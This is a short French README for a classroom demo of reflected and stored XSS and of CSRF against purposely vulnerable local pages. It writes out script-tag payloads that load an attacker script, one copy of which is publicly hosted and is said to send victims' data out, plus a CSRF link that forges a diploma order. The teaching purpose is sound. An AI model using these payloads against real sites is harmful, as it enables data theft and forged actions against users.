Démo d'attaques de type XSS et CSRG

Exécuter le serveur:
node attackdemo.js

Considérer le fichier JavaScript "malicieux": attackscript.js

1. Attaque XSS non persistante:
Ouvrir la page http://localhost:8080/bingets.html

Taper dans l'expression de recherche:
<script src='http://localhost:8080/attackscript.js'></script>

- ou - version publiquement hébergée du script
<script src='http://teaching-api.juliengs.ca/attackscript.js'></script>

Partager l'URL avec quelqu'un d'autre -- le script "malicieux" s'exécutera avec les privilèges du domaine https://localhost:8080 (il "transmettra" les information obtenues à l'attaquant).

2. Attaque XSS persistante:

Ouvrir la page http://localhost:8080/redets

Publier un post content:
<script src='http://localhost:8080/attackscript.js'></script>

- ou - version publiquement hébergée du script
<script src='http://teaching-api.juliengs.ca/attackscript.js'></script>

Partager l'URL de RedETS avec quelqu'un d'autre: toute personne qui accède maintenant à la page de RedETS "subit" l'attaque.
http://localhost:8080/redets
Les informations seront "transmises" à l'attaquant.

3. Attaque CSRF:

Vous transmettez le lien suivant avec d'autres étudiants:
http://localhost:8080/getdiploma?address=1234%20Henri-Bourassa%20H1H1H1

Un diplôme au nom de la "victime" sera automatiquement commandé à l'adresse voulue par l'attaquant.
